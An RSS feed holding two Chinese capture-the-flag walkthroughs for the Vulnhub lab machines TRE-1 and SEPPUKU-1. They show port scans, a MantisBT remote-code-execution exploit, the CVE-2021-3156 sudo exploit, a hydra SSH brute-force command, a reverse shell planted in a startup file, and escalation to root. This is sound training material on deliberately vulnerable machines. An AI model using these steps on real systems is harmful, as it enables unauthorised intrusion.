<?xml-stylesheet href="/rss.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Vulnhub靶机教程</title><link>https://www.vulnhub.cn/</link><description>Recent content on Vulnhub靶机教程</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>This is a customized copyright.</copyright><lastBuildDate>Sun, 04 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://www.vulnhub.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnhub 483 TRE-1</title><link>https://www.vulnhub.cn/walkthrough/483/</link><pubDate>Wed, 13 May 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/483/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/483/ -&lt;p>考点：mantisbt、开机启动&lt;/p>
&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/tre-1,483/">https://www.vulnhub.com/entry/tre-1,483/&lt;/a>&lt;/p>
&lt;h2 id="环境配置">环境配置&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>名称&lt;/th>
&lt;th>IP&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Kali Linux&lt;/td>
&lt;td>10.0.2.15&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Tre&lt;/td>
&lt;td>10.0.2.18&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="初步打点">初步打点&lt;/h2>
&lt;h3 id="端口扫描">端口扫描&lt;/h3>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> 99:1a:ea:d7:d7:b3:48:80:9f:88:82:2a:14:eb:5f:0e (RSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> f4:f6:9c:db:cf:d4:df:6a:91:0a:81:05:de:fa:8d:f8 (ECDSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> ed:b9:a9:d7:2d:00:f8:1b:d3:99:d6:02:e5:ad:17:9f (ED25519)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.38 ((Debian))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Tre
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET POST OPTIONS HEAD
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.38 (Debian)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8082/tcp open http nginx 1.14.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Tre
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: nginx/1.14.2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
&lt;h4 id="gobuster">gobuster&lt;/h4>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gobuster dir --url http://10.0.2.18 -w /usr/share/wordlists/dirb/big.txt -x .php
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>80端口测试，nikto发现存在system目录，使用admin admin登录，系统是MantisBT
&lt;img src="https://www.vulnhub.cn/walkthrough/483/1.webp" alt="1">&lt;/p>
&lt;p>发现存在二级目录mantisbt&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/483/2.webp" alt="2">&lt;/p>
&lt;h2 id="获得权限">获得权限&lt;/h2>
&lt;h3 id="思路一">思路一&lt;/h3>
&lt;p>搜索mantisbt存在漏洞&lt;/p>
&lt;p>&lt;a href="https://www.exploit-db.com/exploits/48818">Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)&lt;/a>&lt;/p>
&lt;p>修改exp&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/483/3.webp" alt="3">&lt;/p>
&lt;p>直接写入shell&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/483/4.webp" alt="4">&lt;/p>
&lt;h3 id="思路二">思路二&lt;/h3>
&lt;p>发现a.txt&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/483/5.webp" alt="5">&lt;/p>
&lt;p>读取到敏感信息&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/483/6.webp" alt="6">&lt;/p>
&lt;p>通过adminer.php读取到疑似密码的字符串&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/483/7.webp" alt="7">&lt;/p>
&lt;p>登录ssh成功&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/483/8.webp" alt="8">&lt;/p>
&lt;h2 id="提权">提权&lt;/h2>
&lt;h3 id="思路一-1">思路一&lt;/h3>
&lt;p>使用CVE-2021-3156提权&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ whereis python
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python3.7 exploit_nss.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="思路二-1">思路二&lt;/h3>
&lt;p>使用tre登录后，查看可随时关机或重启&lt;img src="https://www.vulnhub.cn/walkthrough/483/9.webp" alt="9">&lt;/p>
&lt;p>发现开机启动的文件可写，写入反弹shell后重启&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/483/10.webp" alt="10">&lt;/p>- https://www.vulnhub.cn/walkthrough/483/ - This is a customized copyright.</description></item><item><title>Vulnhub 484 SEPPUKU-1</title><link>https://www.vulnhub.cn/walkthrough/484/</link><pubDate>Wed, 13 May 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/484/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/484/ -&lt;p>考点：hydra,id_rsa&lt;/p>
&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/seppuku-1,484/">https://www.vulnhub.com/entry/seppuku-1,484/&lt;/a>&lt;/p>
&lt;h2 id="环境配置">环境配置&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>名称&lt;/th>
&lt;th>IP&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Kali Linux&lt;/td>
&lt;td>10.0.2.24&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>SEPPUKU-1&lt;/td>
&lt;td>10.0.2.33&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="初步打点">初步打点&lt;/h2>
&lt;h3 id="端口扫描">端口扫描&lt;/h3>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.33
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>21/tcp open ftp vsftpd 3.0.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http nginx 1.14.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: nginx/1.14.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: &lt;span style="color:#b452cd">401&lt;/span> Authorization Required
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-auth:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| HTTP/1.1 &lt;span style="color:#b452cd">401&lt;/span> Unauthorized&lt;span style="color:#cd5555">\x&lt;/span>0D
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Basic &lt;span style="color:#00688b">realm&lt;/span>=Restricted Content
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>445/tcp open netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>7080/tcp open ssl/empowerid LiteSpeed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: LiteSpeed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| tls-alpn:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| h2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| spdy/3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| spdy/2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ http/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssl-cert: Subject: &lt;span style="color:#00688b">commonName&lt;/span>=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Issuer: &lt;span style="color:#00688b">commonName&lt;/span>=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key type: rsa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key bits: &lt;span style="color:#b452cd">2048&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Signature Algorithm: sha256WithRSAEncryption
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid before: 2020-05-13T06:51:35
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid after: 2022-08-11T06:51:35
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| MD5: &lt;span style="color:#b452cd">2002&lt;/span> 61c4 9f2d 6bfa 21d1 477c 21d9 e703
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_SHA-1: e44a c855 93ba b3f8 b2f3 7ce5 db7f a350 2f49 c7ca
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ssl-date: TLS randomness does not represent &lt;span style="color:#658b00">time&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Did not follow redirect to https://10.0.2.33:7080/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>7601/tcp open http Apache httpd 2.4.38 ((Debian))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.38 (Debian)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Seppuku
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: POST OPTIONS HEAD GET
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8088/tcp open http LiteSpeed httpd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: LiteSpeed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Seppuku
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>端口21未发现可利用信息&lt;/p>
&lt;p>端口139、445未发现可利用信息&lt;/p>
&lt;h3 id="web测试">WEB测试&lt;/h3>
&lt;h4 id="端口80">端口80&lt;/h4>
&lt;p>phpinfo 页面 &lt;a href="http://10.0.2.33/info.php">http://10.0.2.33/info.php&lt;/a>&lt;/p>
&lt;p>无其他可利用信息&lt;/p>
&lt;h4 id="端口7080">端口7080&lt;/h4>
&lt;p>未发现可利用信息&lt;/p>
&lt;h4 id="端口7601">端口7601&lt;/h4>
&lt;p>发现两个目录&lt;/p>
&lt;h5 id="keys">&lt;code>/keys&lt;/code>&lt;/h5>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/484/1.webp" alt="1">&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/484/2.webp" alt="2">&lt;/p>
&lt;p>显然private是个ssh登录密钥，但是用户名未知&lt;/p>
&lt;h5 id="secret">&lt;code>/secret&lt;/code>&lt;/h5>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/484/3.webp" alt="3">&lt;/p>
&lt;p>查看文件&lt;code>passwd.bak&lt;/code>和&lt;code>shadow.bak&lt;/code>发现兔子洞用户，查看文件&lt;code>hostname&lt;/code>获得&lt;code>seppuku&lt;/code>，下载&lt;code>password.lst&lt;/code>作为密码字典&lt;/p>
&lt;h4 id="端口8088">端口8088&lt;/h4>
&lt;p>未发现可利用信息&lt;/p>
&lt;h2 id="获得权限">获得权限&lt;/h2>
&lt;h3 id="爆破ssh">爆破ssh&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ hydra -l seppuku -P password.lst -f 10.0.2.33 ssh
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/484/4.webp" alt="4">&lt;/p>
&lt;p>登录成功&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/484/5.webp" alt="5">&lt;/p>
&lt;p>发现&lt;code>.passwd&lt;/code>保存了密码信息&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/484/6.webp" alt="6">&lt;/p>
&lt;p>测试发现是用户&lt;code>samurai&lt;/code>的密码&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/484/7.webp" alt="7">&lt;/p>
&lt;p>那上面获得的ssh登录密钥，很可能是三个用户未获得权限的那个用户tanto的&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/484/8.webp" alt="8">&lt;/p>
&lt;p>至此，三个普通用户的权限全部拿到&lt;/p>
&lt;h2 id="提权">提权&lt;/h2>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/484/9.webp" alt="9">&lt;/p>
&lt;p>只需要新建文件并写入bash就可以获得root权限&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/484/10.webp" alt="10">&lt;/p>
&lt;p>免密执行后获得root权限执行的bash&lt;/p>
